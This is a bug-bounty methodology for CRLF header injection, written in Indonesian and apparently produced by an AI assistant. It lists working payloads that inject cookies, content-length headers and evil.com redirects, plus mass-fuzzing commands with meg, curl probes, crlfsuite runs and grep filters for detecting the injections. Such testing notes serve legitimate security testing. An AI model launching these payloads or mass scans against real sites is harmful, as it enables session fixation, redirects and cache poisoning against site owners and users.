# Methodology CRLF Injection

---

## 1. CRLF Payload Collection

```bash id="crlf1"
# daftar payload dasar CRLF injection
/%0d%0aSet-Cookie:crlf=injection
/%0aSet-Cookie:crlf=injection
/%0dSet-Cookie:crlf=injection
/%0d%0aContent-Length:0
/%0d%0aLocation:https://evil.com
```

**Penjelasan:**
Kumpulan payload untuk mencoba injection ke header HTTP via CRLF (newline injection).

---

## 2. Automated Fuzzing with meg

```bash id="crlf2"
meg --verbose paths hosts --concurrency 80 /%0aSet-Cookie:%20crlf=injection > out

meg --verbose paths hosts --concurrency 80 "/%0d%0aSet-Cookie:crlf=injection" > out
```

**Penjelasan:**
Melakukan fuzzing endpoint untuk melihat apakah CRLF injection dipantulkan di response.

---

## 3. Response Filtering & Detection

### 3.1 Detect Set-Cookie Injection

```bash id="crlf3"
# cari indikasi header injection
grep -Rni "Set-Cookie" out | grep -i crlf
```

**Penjelasan:**
Mendeteksi apakah payload berhasil menyisipkan cookie baru di response header.

---

### 3.2 Detect Redirect Injection

```bash id="crlf4"
# cari redirect injection
grep -Rni "Location" out | grep -i "%0d%0a\|%0a"
```

**Penjelasan:**
Mencari kemungkinan header Location yang berhasil dimanipulasi.

---

### 3.3 Detect Header Splitting Behavior

```bash id="crlf5"
grep -Rni "HTTP/" out | grep -i "Set-Cookie"

grep -Rni "Content-Type" out | grep -i "%0d%0a\|%0a"
grep -Rni "Location" out | grep -i "%0d%0a\|%0a"
grep -Rni "Content-Disposition" out | grep -i "%0d%0a\|%0a"
```

**Penjelasan:**
Mencari indikasi split response header akibat CRLF injection.

---

## 4. Manual Validation (curl Testing)

### 4.1 Basic Test

```bash id="crlf6"
curl -i "https://target/%0d%0aSet-Cookie:crlf=injection"
```

**Penjelasan:**
Test dasar untuk melihat apakah payload diproses di response header.

---

### 4.2 Follow Redirect Chain

```bash id="crlf7"
curl -i -L "https://target/%0d%0aSet-Cookie:crlf=injection"
```

**Penjelasan:**
Melihat apakah injection tetap terjadi saat redirect.

---

### 4.3 Path-Based Injection Check

```bash id="crlf8"
curl -i --path-as-is "https://target/%0d%0aSet-Cookie:crlf=1"
```

**Penjelasan:**
Memastikan raw path tidak di-encode ulang oleh server/CDN.

---

## 5. crlfsuite Automation Tool

```bash id="crlf9"
# aktifkan environment
source ~/belajar/bug_bounty/Tools/myenv/bin/activate

# single target
crlfsuite -t http://testphp.vulnweb.com/

# multiple targets
crlfsuite -iT hosts
crlfsuite -iT urls

# POST method testing
crlfsuite -t http://testphp.vulnweb.com/ --method POST

# cookie based testing
crlfsuite -t http://testphp.vulnweb.com -c “PHPSESSID=c91ef49b7069ca6da302c6798d504eb3”
```

**Penjelasan:**
Tool otomatis untuk mendeteksi CRLF injection di berbagai metode request.

---

## 6. Blind CRLF Detection

```bash id="crlf10"
curl -i "https://target/%0d%0aX-Test:crlf"
curl -i -I "https://target/%0d%0aX-Test:crlf"
```

```text
# cek hasil:
- header muncul
- duplicate header
- anomali caching behavior
```

**Penjelasan:**
Deteksi CRLF tanpa refleksi langsung, hanya dari perubahan response header.

---

## 7. CRLF via Query Parameter

```bash id="crlf11"
https://target.com/?q=%0d%0aSet-Cookie:crlf=1
https://target.com/?redirect=%0d%0aLocation:https://evil.com
```

**Penjelasan:**
Menguji injection lewat parameter URL yang sering diproses backend.

---

## 8. Proxy / CDN Bypass Angle (High Value)

```bash id="crlf12"
curl -i "https://target.com" -H "X-Forwarded-For: 127.0.0.1%0d%0aX-Test:1"
curl -i "https://target.com" -H "X-Real-IP: 127.0.0.1%0d%0aInjected:1"
```

**Penjelasan:**
Menguji apakah header spoofing bisa memicu CRLF di layer proxy/CDN.

---

Kalau mau, next step aku bisa bantu:

* merge semua ini jadi **Vuln CRLF Playbook (level pro / bug bounty handbook style)**
* atau bikin **automation pipeline (CRLF + 403 + CORS dalam 1 flow)**
